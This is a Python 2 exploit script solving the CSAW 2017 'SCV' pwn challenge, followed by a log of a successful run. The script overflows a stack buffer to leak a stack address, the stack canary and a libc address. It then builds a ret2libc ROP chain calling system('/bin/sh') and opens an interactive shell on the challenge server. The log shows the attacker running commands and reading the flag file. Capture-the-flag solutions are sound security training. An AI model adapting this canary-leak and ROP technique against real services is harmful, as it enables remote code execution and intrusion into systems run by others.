#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# CSAW 2017 - SCV (pwn 100)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string


# --------------------------------------------------------------------------------------------------
def recv_until(st):                                 # receive until you encounter a string
    ret = ""
    while st not in ret:
        ret += s.recv(8192)

    return ret


# --------------------------------------------------------------------------------------------------
def feed(food):                                     # send data to the buffer
    s.send('1' + '\n')

    recv_until(">>")
    s.send(food + '\n')

    recv_until(">>")

# --------------------------------------------------------------------------------------------------
def review(sig, slen):                              # leak data appeared after a given signature
    s.send('2' + '\n')

    r    = recv_until(">>")
    off  = r.find(sig) + slen
    leak = struct.unpack("<Q", r[off:off+8])[0]

    return leak


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('pwn.chal.csaw.io', 3764))
   #s = socket.create_connection(('localhost', 7777))

    recv_until(">>")                                # eat banner

    # -------------------------------------------------------------------------
    # Overflow buffer and leak a stack address
    # -------------------------------------------------------------------------
    feed('k'*0x9f)
    stack = review('kkkkkkk\n', 8) & 0x0000ffffffffffff

    print '[+] Leaking a stack address:', hex(stack)

    # -------------------------------------------------------------------------
    # Overflow buffer and leak canary
    # -------------------------------------------------------------------------
    feed('k'*0xa8)
    canary = review('kkkkkkk\n', 7) & 0xffffffffffffff00

    # canary's LSB is always 0
    print '[+] Leaking canary:', hex(canary)

    # -------------------------------------------------------------------------
    # Overflow buffer and leak a libc address
    # -------------------------------------------------------------------------
    feed('k'*0xb7)
    libc = review('kkkkkkk\n', 8) & 0x0000ffffffffffff

    print '[+] Leaking a libc address:', hex(libc)

    # -------------------------------------------------------------------------
    # Overflow buffer and craft the ROP chaing
    # -------------------------------------------------------------------------
    # local machine:
    #   leak:   00007FFFF772EF45 (= __libc_start_main + 0xf5)
    #   system: 00007FFFF7753590
    #
    # remote machine:
    #   __libc_start_main: 0000000000020740
    #   system:            0000000000045390
    #
    #system = libc + 0x00007FFFF7753590 - 0x00007FFFF772EF45
    system = libc + 0x0000000000045390 - 0x0000000000020740 - 0xf5

    print '[+] system() at:', hex(system)

    # stack leak: 00007FFFFFFFDCE0
    # &/bin/sh:   00007FFFFFFFDB50
    binsh = stack + 0x00007FFFFFFFDB50 - 0x00007FFFFFFFDCE0

    print '[+] "/bin/sh" at:', hex(binsh)

    # rop gadget (just a pop rdi; ret)
    #   .text:0000000000400EA2 41 5F           pop     r15
    #   .text:0000000000400EA4 C3              retn
    #
    # gadget at: 0x400EA3 == pop rdi; ret
    ovfl  = '/bin/sh\x00'
    ovfl += 'k'*0xa0
    ovfl += struct.pack("<Q", canary)
    ovfl += 'A'*8
    ovfl += struct.pack("<Q", 0x400ea3)
    ovfl += struct.pack("<Q", binsh)
    ovfl += struct.pack("<Q", system)

    feed(ovfl)

    # -------------------------------------------------------------------------
    # get shell
    # -------------------------------------------------------------------------
    s.send('3' + '\n')                              # return and trigger overflow
    print recv_until("...")

    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                          # try to open shell
    t.sock = s
    t.interact()


# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/2017/csaw_ctf/SCV$ ./scv_expl.py
    [+] Leaking a stack address: 0x7fffe9b87a30
    [+] Leaking canary: 0x561558c1c5928200L
    [+] Leaking a libc address: 0x7f047640c830
    [+] system() at: 0x7f047643138b
    [+] "/bin/sh" at: 0x7fffe9b878a0
    [*]BYE ~ TIME TO MINE MIENRALS...

    [+] Opening Shell...
    id
        uid=1000(scv) gid=1000(scv) groups=1000(scv)
    date
        Sat Sep 16 03:58:10 UTC 2017
    ls -l
    total 16
        -r--r-----  1 root scv     46 Sep 10 22:49 flag
        -rwxr-xr-x  1 root root 10488 Sep 10 22:51 scv
    cat flag
        flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
    exit
    *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
